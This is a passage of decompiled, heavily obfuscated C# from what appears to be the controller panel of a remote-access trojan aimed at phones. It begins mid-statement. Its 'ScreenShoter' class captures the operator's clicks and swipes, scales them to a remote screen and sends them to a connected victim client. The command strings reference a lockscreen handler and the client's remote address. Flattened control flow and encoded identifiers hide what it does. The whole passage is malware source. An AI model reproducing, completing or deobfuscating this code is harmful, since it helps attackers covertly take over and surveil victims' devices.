          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0030402074A + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u00351262454),
          (object) ((ScreenShoter) this).Classclient
        });
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
    {
      if (((ScreenShoter) this).Classclient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        ((ScreenShoter) this).Classclient.SendMessage(new object[4]
        {
          (object) ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient,
          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00326654E2A + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u0033A170973),
          (object) ((ScreenShoter) this).Classclient
        });
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_3:
        int num1 = -447616786;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((930686307 ^ -2140044609) - -(~(num2 * -631948493) + ~--2133580802) - -2034130785)) % 3U)
          {
            case 0:
              goto label_7;
            case 1:
              ProjectData.ClearProjectError();
              num1 = (int) num3 * 917367522 ^ -1635064656;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_7:
        return;
label_8:;
      }
    }

    private void Viewpanel_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        goto label_6;
label_1:
      int num1 = 302636085;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-1767138292 - ~-(~-num2 * 1412113989))) % 6U)
        {
          case 0:
            goto label_6;
          case 1:
            ((ScreenShoter) this).Trakpoint = new List<Point>();
            ((ScreenShoter) this).Trakpoint.Add(new Point(e.X, e.Y));
            ((ScreenShoter) this).isclick = false;
            num1 = (int) num3 * 137255918 ^ 863046735;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num3 * 257331655 ^ -1702881705;
            continue;
          case 4:
            goto label_1;
          case 5:
            ((ScreenShoter) this).isdown = true;
            num1 = (int) num3 * 359293001 ^ 983065280;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_6:
      ((ScreenShoter) this).isclick = true;
      num1 = -552261256;
      goto label_2;
    }

    private void Viewpanel_MouseMove(object sender, MouseEventArgs e)
    {
      if (!((ScreenShoter) this).isdown)
        return;
label_1:
      int num1 = 2005743462;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -(1948989297 + --784798352 - -1037706370 * -994393179 - ((num2 ^ -(-(~-987274932 + (-1858624061 ^ -109945348)) - (-636283422 * 1351610749 - -509236253 + ~-254869312))) - (--708451878 - (-(-1541309447 ^ 987143846) + ~--902158209))) - (~1306542439 + (-1864354748 ^ -1949567193)) - -355174623)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            ((ScreenShoter) this).Swaping = true;
            ((ScreenShoter) this).isclick = false;
            ((ScreenShoter) this).Trakpoint.Add(new Point(e.X, e.Y));
            num1 = (int) num3 * 146311076 ^ 346597620;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void Viewpanel_MouseUp(object sender, MouseEventArgs e)
    {
      ((ScreenShoter) this).isdown = false;
label_1:
      int num1 = -1112009047;
      int height;
      int width;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~~num1 ^ 481408652 - (1683338451 ^ 1960080833))) % 7U)
        {
          case 0:
            ((ScreenShoter) this).Trakpoint.Add(new Point(e.X, e.Y));
            num1 = (int) num2 * 986560818 ^ 53385800;
            continue;
          case 2:
            width = this.viewpanel.Width;
            num1 = (int) num2 * -1557728909 ^ -57585949;
            continue;
          case 3:
            height = this.viewpanel.Height;
            if (!((ScreenShoter) this).isclick)
            {
              num1 = (int) num2 * -1609584087 ^ 1619850519;
              continue;
            }
            goto label_29;
          case 4:
            ((ScreenShoter) this).Swaping = false;
            num1 = (int) num2 * -968801552 ^ 417565636;
            continue;
          case 5:
            goto label_1;
          case 6:
            if (((ScreenShoter) this).Swaping)
            {
              num1 = (int) num2 * -1648120126 ^ -1527880986;
              continue;
            }
            goto label_25;
          default:
            goto label_10;
        }
      }
label_25:
      return;
label_10:
      StringBuilder stringBuilder = new StringBuilder();
      List<Point>.Enumerator enumerator;
      try
      {
        enumerator = ((ScreenShoter) this).Trakpoint.GetEnumerator();
label_12:
        int num3 = -386242494;
        Point current;
        Point point;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (-~~num3 ^ 481408652 - (1683338451 ^ 1960080833))) % 7U)
          {
            case 0:
              stringBuilder.Append(point.ToString() + EXGuarder.\u003326F0B45);
              num3 = (int) num4 * 697296775 ^ -1930141783;
              continue;
            case 1:
              int num5;
              num3 = num5 = enumerator.MoveNext() ? -1591565583 : (num5 = -2105970047);
              continue;
            case 2:
              point = new Point(checked ((int) Math.Round(unchecked ((double) current.X * (double) ((ScreenShoter) this).ScreenSize.Width / (double) width))), checked ((int) Math.Round(unchecked ((double) current.Y * (double) ((ScreenShoter) this).ScreenSize.Height / (double) height))));
              num3 = (int) num4 * 782874494 ^ -1535965663;
              continue;
            case 3:
              goto label_12;
            case 4:
              current = enumerator.Current;
              num3 = -717609856;
              continue;
            case 6:
              num3 = (int) num4 * -1486740198 ^ 1130840926;
              continue;
            default:
              goto label_22;
          }
        }
      }
      finally
      {
        enumerator.Dispose();
      }
label_22:
      string[] strArray1 = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      object[] ParametersObjects1 = new object[4]
      {
        (object) ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient,
        (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003144C6764 + stringBuilder.ToString() + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
        (object) Codes.Encoding().GetBytes(EXGuarder.\u00374420A09),
        (object) ((ScreenShoter) this).Classclient
      };
label_23:
      int num6 = -143844601;
label_24:
      string[] strArray2;
      object[] ParametersObjects2;
      string str1;
      Point client;
      Point point1;
      while (true)
      {
        uint num7;
        switch ((num7 = (uint) (-~~num6 ^ 481408652 - (1683338451 ^ 1960080833))) % 9U)
        {
          case 0:
            ((ScreenShoter) this).Classclient.SendMessage(ParametersObjects2);
            num6 = (int) num7 * -187272287 ^ 577781222;
            continue;
          case 1:
            string str2 = str1;
            int num8 = point1.X;
            string str3 = num8.ToString();
            string str4 = EXGuarder.\u003326F0B45;
            num8 = point1.Y;
            string str5 = num8.ToString();
            str1 = str2 + str3 + str4 + str5;
            num6 = (int) num7 * 915547370 ^ 54546383;
            continue;
          case 2:
            goto label_23;
          case 3:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects2 = new object[4]
            {
              (object) ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003144C6764 + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00374420A09),
              (object) ((ScreenShoter) this).Classclient
            };
            num6 = (int) num7 * 306296698 ^ 2121751100;
            continue;
          case 4:
            goto label_20;
          case 5:
            ((ScreenShoter) this).Classclient.SendMessage(ParametersObjects1);
            num6 = (int) num7 * -1312824229 ^ 1627370663;
            continue;
          case 6:
            strArray2 = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
            num6 = (int) num7 * 1509709639 ^ 2083792266;
            continue;
          case 7:
            goto label_29;
          case 8:
            point1 = new Point(checked ((int) Math.Round(unchecked ((double) client.X * (double) width / (double) width))), checked ((int) Math.Round(unchecked ((double) client.Y * (double) height / (double) height))));
            num6 = (int) num7 * 224778074 ^ 1864393187;
            continue;
          default:
            goto label_14;
        }
      }
label_20:
      return;
label_14:
      return;
label_29:
      str1 = EXGuarder.\u00338341B66;
      ((ScreenShoter) this).tiks = 0;
      client = this.viewpanel.PointToClient(Control.MousePosition);
      num6 = -1448090601;
      goto label_24;
    }

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern ScreenReader(object TargetObject, IntPtr TargetMethod);

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public virtual extern IAsyncResult BeginInvoke(
      object[] objs,
      AsyncCallback DelegateCallback,
      object DelegateAsyncState);

    public delegate void addLogback(object[] objs);
  }
}
